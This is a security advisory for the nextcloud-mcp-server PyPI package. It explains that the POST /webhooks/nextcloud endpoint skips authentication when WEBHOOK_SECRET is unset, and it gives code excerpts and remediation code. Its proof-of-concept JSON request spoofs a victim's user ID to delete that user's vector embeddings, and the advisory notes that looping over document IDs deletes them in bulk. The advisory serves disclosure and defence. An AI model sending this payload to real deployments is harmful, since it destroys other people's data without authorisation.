# [C] nextcloud-mcp-server: Unauthenticated `POST /webhooks/nextcloud` allows arbitrary vector data deletion when `WEBHOOK_SECRET` is unset ( default )

## Summary
Severity: Critical
Advisory: GHSA-8vh3-g2qg-2h2c
CVE: CVE-2026-55640
CWE: CWE-306
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-8vh3-g2qg-2h2c
Type: github-advisory

## Affected
- PyPI: `nextcloud-mcp-server` — affected >=0 <0.117.2

## Details
## Summary
The `POST /webhooks/nextcloud` endpoint has no authentication by default: `WEBHOOK_SECRET` defaults to `None` and is never required by startup validation. When unset, the receiver accepts any unauthenticated POST. The `user_id` is taken directly from the attacker-supplied payload and passed to Qdrant, allowing an unauthenticated attacker to delete or corrupt vector embeddings for any user.

## Details
**Vulnerable file:** `nextcloud_mcp_server/vector/webhook_receiver.py`, function `handle_nextcloud_webhook()`, **lines 55-67**

**Root cause 1**: Auth check is guarded by `if secret`: - skipped entirely when `WEBHOOK_SECRET` is unset.

**Root cause 2**: `webhook_secret: str | None = None` in config - no startup validator enforces it, even when vector sync is enabled.

**Trusted field**: `payload["user"]["uid"]` in `webhook_parser.py` is used as-is for all Qdrant operations - no cross-check against an authenticated session.

`webhook_receiver.py`, **lines 55-67**:
```python
secret = get_settings().webhook_secret  # None by default
if secret:                           # skipped entirely when unset
    ... validate Bearer header ...
else:
    _warn_missing_secret_once()     # just logs, still processes
```
`webhook_parser.py`, **line 57**:
```python
user_id = payload["user"]["uid"]     # attacker-controlled
```
## PoC
**No credentials required**. Works on any deployment where `WEBHOOK_SECRET` is not explicitly set (the default).
```json
POST /webhooks/nextcloud
Content-Type: application/json

{
  "event": {
    "class": "OCP\\Files\\Events\\Node\\BeforeNodeDeletedEvent",
    "node": { "path": "/victim/files/Notes/any.md", "id": 12345 }
  },
  "user": { "uid": "victim" },
  "time": 0
}
```
**Result:** **Qdrant** deletes all vector embeddings for `victim` doc `12345` with **no authentication**. Attacker can loop over doc IDs for mass deletion.  All user targets accepted.


## Impact
+ Anyone on the network with access to port `8000` - no credentials needed.
+ Attacker can delete or trigger re-index of any user's vector embeddings in Qdrant by spoofing `user.uid` in the payload.
+ Mass-sending delete events for all doc IDs destroys the entire semantic search index for all users, requiring a full re-scan to recover.

## Recommend Fix
1. Enforce `WEBHOOK_SECRET` at startup ( file `config_validators.py` )
```python
if vector_sync_enabled and not settings.webhook_secret:
    raise ConfigurationError(
        "WEBHOOK_SECRET must be set when vector sync is enabled"
    )
```
2. Reject requests when secret is unset ( file `webhook_receiver.py` )
```python
secret = get_settings().webhook_secret
if not secret:
    return JSONResponse({"status": "unavailable"}, status_code=503)
provided = request.headers.get("authorization", "").encode()
if not hmac.compare_digest(provided, f"Bearer {secret}".encode()):
    return JSONResponse({"status": "unauthorized"}, status_code=401)
```

## References
- https://github.com/cbcoutinho/nextcloud-mcp-server/security/advisories/GHSA-8vh3-g2qg-2h2c
- https://github.com/cbcoutinho/nextcloud-mcp-server/commit/4fc2b10945108cf1008ec9698291de6706ffcb73
- https://github.com/cbcoutinho/nextcloud-mcp-server
- https://github.com/cbcoutinho/nextcloud-mcp-server/tree/v0.117.2
